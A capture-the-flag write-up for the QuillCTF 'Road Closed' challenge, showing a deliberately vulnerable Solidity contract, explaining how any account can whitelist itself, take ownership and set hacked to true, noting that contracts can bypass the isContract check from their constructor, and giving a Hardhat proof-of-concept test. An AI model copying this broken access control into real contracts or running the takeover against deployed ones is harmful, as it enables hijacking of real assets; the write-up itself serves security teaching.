# QuillCTF 1: Road Closed

**Objective of CTF:**

- Become the owner of the contract.
- Change the value of hacked to `true`.

**Target contract:**

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

contract RoadClosed {
  bool hacked;
  address owner;
  address pwner;
  mapping(address => bool) whitelistedMinters;

  function isContract(address addr) public view returns (bool) {
    uint size;
    assembly {
      size := extcodesize(addr)
    }
    return size > 0;
  }

  function isOwner() public view returns (bool) {
    if (msg.sender == owner) {
      return true;
    } else return false;
  }

  constructor() {
    owner = msg.sender;
  }

  function addToWhitelist(address addr) public {
    require(!isContract(addr), "Contracts are not allowed");
    whitelistedMinters[addr] = true;
  }

  function changeOwner(address addr) public {
    require(whitelistedMinters[addr], "You are not whitelisted");
    require(msg.sender == addr, "address must be msg.sender");
    require(addr != address(0), "Zero address");
    owner = addr;
  }

  function pwn(address addr) external payable {
    require(!isContract(msg.sender), "Contracts are not allowed");
    require(msg.sender == addr, "address must be msg.sender");
    require(msg.sender == owner, "Must be owner");
    hacked = true;
  }

  function pwn() external payable {
    require(msg.sender == pwner);
    hacked = true;
  }

  function isHacked() public view returns (bool) {
    return hacked;
  }
}
```

## The Attack

We can immediately see that non-contract accounts can whitelist themselves via the `addToWhitelist` function. A whitelisted account can become the owner simply by calling the `changeOwner` function. Once an account becomes the owner, all that is left to do is call the `pwn` function, and the contract will have `hacked = true`. In short:

1. `addToWhitelist(yourAddress)`
2. `changeOwner(yourAddress)`
3. `pwn(yourAddress)`

As an extra note, you can do this hack with a contract if you execute everything within the constructor, because `extcodesize` of a contract at it's constructor phase will return 0.

## Proof of Concept

The Hardhat test code to demonstrate this attack is given below. Contract types are generated via TypeChain.

```typescript
describe('QuillCTF 1: Road Closed', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: RoadClosed;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('RoadClosed', owner).then(f => f.deploy());
    await contract.deployed();
  });

  it('should hijack ownership', async () => {
    expect(await contract.isOwner()).to.be.true;

    // use attacker's pov for the contract
    contract = contract.connect(attacker);

    // whitelist yourself
    await contract.connect(attacker).addToWhitelist(attacker.address);

    // change owner
    await contract.connect(attacker).changeOwner(attacker.address);

    // pwn
    await contract.connect(attacker)['pwn(address)'](attacker.address);
  });

  after(async () => {
    // contract should be hacked & you should be the owner
    expect(await contract.isHacked()).to.be.true;
    expect(await contract.isOwner()).to.be.true;
  });
});
```
